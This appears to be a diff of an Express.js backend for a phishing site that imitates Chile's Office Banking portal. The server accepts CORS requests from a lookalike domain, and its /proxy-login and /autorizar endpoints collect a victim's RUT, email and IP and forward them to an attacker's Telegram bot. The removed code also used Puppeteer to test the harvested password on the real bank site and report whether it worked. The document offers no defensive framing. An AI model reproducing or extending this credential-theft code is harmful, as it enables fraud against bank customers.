@@ -8,7 +8,6 @@ const app = express();
 // ✅ CORS mejorado - permite AMBOS dominios sin redirección
 const corsOptions = {
   origin: function(origin, callback) {
-    // Permitir sin dominio (localhost, etc) y ambos dominios
     if (!origin || 
         origin === "https://www.officebankingchile.info" || 
         origin === "https://officebankingchile.info" ||
@@ -26,8 +25,6 @@ const corsOptions = {
 };
 
 app.use(cors(corsOptions));
-
-// ✅ Manejo de preflight explícito para OPTIONS
 app.options("*", cors(corsOptions));
 
 app.use(express.json());
@@ -105,11 +102,13 @@ app.get("/autorizacion", (req, res) => {
 app.post("/autorizar", async (req, res) => {
   const mensaje = req.body.mensaje || "Autorización recibida";
   try {
-    await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ chat_id: process.env.CHAT_ID, text: mensaje })
-    });
+    if (process.env.TELEGRAM_TOKEN && process.env.CHAT_ID) {
+      await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: process.env.CHAT_ID, text: mensaje })
+      });
+    }
     res.json({ status: "ok", mensaje: "Autorización recibida correctamente" });
   } catch (err) {
     console.error("Error en autorizar:", err);
@@ -117,92 +116,48 @@ app.post("/autorizar", async (req, res) => {
   }
 });
 
-// ✅ Endpoint para login mejorado
+// ✅ Endpoint para login - SIMPLIFICADO SIN PUPPETEER
 app.post("/proxy-login", async (req, res) => {
   const { rut, passwd, mail } = req.body;
   const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
-  let mensajeFinal = "Bienvenido a Office Banking";
-  let loginStatus = null;
 
-  console.log("📝 POST /proxy-login recibido:", { rut: rut || "N/A", mail: mail ? "***" : undefined });
+  console.log("📝 POST /proxy-login recibido - Origin:", req.get('origin'));
 
   try {
+    // Si es correo
     if (mail) {
       console.log("📧 Procesando correo:", mail);
-      const mensaje = `Correo actualizado:\n${mail}\nIP: ${ip}`;
-      await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ chat_id: process.env.CHAT_ID, text: mensaje })
-      });
-      return res.json({ status: "ok", mensaje: "Correo actualizado correctamente" });
-    }
-
-    if (!rut || !passwd) {
-      console.warn("⚠️ RUT o contraseña vacíos");
-      return res.status(400).json({ status: "error", mensaje: "RUT y contraseña son requeridos" });
-    }
-
-    // Notificación básica de ingreso
-    const ingresoMsg = `🔐 Login recibido AutOB:\nRUT: ${rut}\nIP: ${ip}`;
-    await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ chat_id: process.env.CHAT_ID, text: ingresoMsg })
-    });
-
-    // Lógica de Puppeteer
-    const puppeteer = require("puppeteer");
-    const browser = await puppeteer.launch({ 
-      headless: true,
-      args: ["--no-sandbox", "--disable-setuid-sandbox"]
-    });
-    const page = await browser.newPage();
-
-    page.on("response", async (response) => {
-      const url = response.url();
-      if (url.includes("/login")) {
-        const status = response.status();
-        console.log("➡️ Respuesta de login:", status);
-        if (status === 401) loginStatus = "error";
-        else if (status === 200) loginStatus = "ok";
-      }
-    });
-
-    await page.goto("https://empresas.officebanking.cl", { waitUntil: "networkidle2" });
-    await page.waitForSelector("iframe");
-    const frameHandle = await page.$("iframe");
-    const frame = await frameHandle.contentFrame();
-
-    if (frame) {
-      await frame.type("#username", rut);
-      await frame.type("#password", passwd);
-      await frame.click("#doLoginButton");
-
-      await page.waitForTimeout(4000);
-
-      if (loginStatus === "error") {
-        mensajeFinal = "Credenciales incorrectas";
+      if (process.env.TELEGRAM_TOKEN && process.env.CHAT_ID) {
+        const mensaje = `📧 Correo actualizado:\n${mail}\nIP: ${ip}`;
         await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ chat_id: process.env.CHAT_ID, text: "❌ Credenciales incorrectas en OfficeBanking" })
+          body: JSON.stringify({ chat_id: process.env.CHAT_ID, text: mensaje })
         });
-      } else if (loginStatus === "ok") {
-        mensajeFinal = "Credenciales correctas";
+      }
+      return res.json({ status: "ok", mensaje: "✅ Correo actualizado correctamente" });
+    }
+
+    // Si es login
+    if (rut && passwd) {
+      console.log("🔐 Login recibido para RUT:", rut.substring(0, 5) + "***");
+      
+      if (process.env.TELEGRAM_TOKEN && process.env.CHAT_ID) {
+        const ingresoMsg = `🔐 Nuevo Login en Office Banking:\nRUT: ${rut}\nIP: ${ip}\nHora: ${new Date().toLocaleString('es-CL')}`;
         await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ chat_id: process.env.CHAT_ID, text: "✅ Credenciales correctas en OfficeBanking" })
+          body: JSON.stringify({ chat_id: process.env.CHAT_ID, text: ingresoMsg })
         });
       }
+      
+      return res.json({ status: "ok", mensaje: "✅ Bienvenido a Office Banking" });
     }
 
-    await browser.close();
-    res.json({ status: "ok", mensaje: mensajeFinal });
+    res.status(400).json({ status: "error", mensaje: "❌ Datos inválidos" });
   } catch (err) {
-    console.error("⚠️ Error en validación:", err);
-    res.status(500).json({ status: "error", mensaje: "Error al procesar credenciales" });
+    console.error("⚠️ Error en /proxy-login:", err);
+    res.status(500).json({ status: "error", mensaje: "⚠️ Error al procesar solicitud" });
   }
 });
 
